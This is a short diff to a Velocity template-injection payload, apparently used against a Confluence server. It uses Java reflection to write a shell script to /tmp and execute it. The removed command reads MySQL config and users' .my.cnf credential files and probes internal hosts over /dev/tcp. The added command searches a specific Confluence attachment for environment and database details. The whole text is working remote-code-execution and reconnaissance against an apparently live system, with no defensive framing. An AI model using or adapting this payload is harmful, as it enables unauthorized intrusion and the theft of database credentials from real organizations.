@@ -1,6 +1,6 @@
 #set($x = "")
 #set($w2 = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$w2.write("echo ===MYCNF===; cat /etc/my.cnf 2>/dev/null | head -30; echo ===MYCNFDIR===; ls /etc/mysql 2>/dev/null | head; cat /etc/mysql/my.cnf 2>/dev/null | head -10; echo ===RETEST43===; timeout 5 bash -c 'cat < /dev/null > /dev/tcp/10.18.19.43/3307' 2>/dev/null && echo 43-3307-OK || echo 43-3307-NO; timeout 5 bash -c 'cat < /dev/null > /dev/tcp/10.18.19.42/3307' 2>/dev/null && echo 42-3307-OK || echo 42-3307-NO; echo ===HOME.CNF===; ls -la /home/confluence/.my.cnf /home/dradmin/.my.cnf /home/druser/.my.cnf 2>&1 | head -5")
+$w2.write("echo ===CTX===; grep -iE 'env|profile|prod|dev|demo|loanbiz|oracle|mysql' /u01/confluence-home/attachments/ver003/200/87/18087950/134/81/36581384/36584200/1 2>/dev/null | head -25; echo ===HEAD===; head -25 /u01/confluence-home/attachments/ver003/200/87/18087950/134/81/36581384/36584200/1 2>/dev/null")
 $w2.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
